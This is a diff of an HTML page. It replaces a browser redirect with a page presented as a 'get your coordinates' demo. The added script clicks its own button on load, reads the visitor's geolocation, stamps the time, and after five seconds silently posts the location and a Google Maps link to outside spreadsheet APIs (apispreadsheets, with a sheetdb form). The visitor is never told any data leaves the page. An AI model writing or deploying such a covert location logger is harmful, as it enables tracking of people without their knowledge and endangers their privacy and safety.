@@ -2,12 +2,117 @@
 <html>
 <body>
 
-<script type="text/javascript">
-  url="http://share.streamlit.com";
-  window.open("googlechrome://navigate?url=" + url,"_system");
+<p>Click the button to get your coordinates.</p>
+
+<button onclick="getLocation()" id="getloc">Try It</button>
+
+<p id="demo"></p>
+
+<script>
+  get_loc=document.getElementById("getloc");
+  get_loc.click();
+var x = document.getElementById("demo");
+
+function getLocation() {
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(showPosition);
+  } else { 
+    x.innerHTML = "Geolocation is not supported by this browser.";
+  }
+}
+
+function showPosition(position) {
+  x.innerHTML = "Latitude: " + position.coords.latitude + 
+  "<br>Longitude: " + position.coords.longitude;
+
+var today = new Date();
+var date = today.getFullYear()+'-'+(today.getMonth()+1)+'-'+today.getDate();
+var time = today.getHours() + ":" + today.getMinutes() + ":" + today.getSeconds();
+var dateTime = date+' '+time;
+document.getElementById("time_stamp").value=dateTime;
+
+
+
+var latlon = position.coords.latitude + "," + position.coords.longitude;
+
+  var img_url = "https://www.google.com/maps/search/?api=1&query="+latlon;
+document.getElementById("lat").value=img_url;
+//document.getElementById("lon").value=position.coords.longitude;
+
+
+
+}
 </script>
+
+
+
+
+
+
+
+
+
+<form name="f_name" id="myForm" action="https://sheetdb.io/api/v1/tzligcj8zu6x4" method="POST" id="sheetdb-form">
+  time: <input name="time_stamp" id="time_stamp">
+  Name: <input name="Latitude" id="lat">
+  
+  <button id="btn" onclick=SubForm()>Submit</button>
+
+</form>
+
+
+<script
+  src="https://code.jquery.com/jquery-3.4.1.js"
+  integrity="sha256-WpOohJOqMqqyKL9FccASB9O0KwACQJpFTUBLTYOVvVU="
+  crossorigin="anonymous"></script>
+
+
+
+
+
+<script type="text/javascript">
+  
+//button_id=document.getElementById("btn")
+//button_id.click()
+    
+
+    
+
+      function sleep (time) {
+  return new Promise((resolve) => setTimeout(resolve, time));
+}
+
+// Usage!
+sleep(5000).then(() => {
+   SubForm()
+});
+
+      function SubForm (){
+      $.ajax({
+        url:"https://api.apispreadsheets.com/data/14714/",
+        type:"post",
+        data:$("#myForm").serializeArray(),
+        success: function(){
+          console.log("Form Data Submitted :)")
+        },
+        error: function(){
+          console.log("There was an error :(")
+        }
+      });
+    }
+
+
+
+
+
+
+
+
+    </script>
+
 
 
 
 </body>
 </html>
+
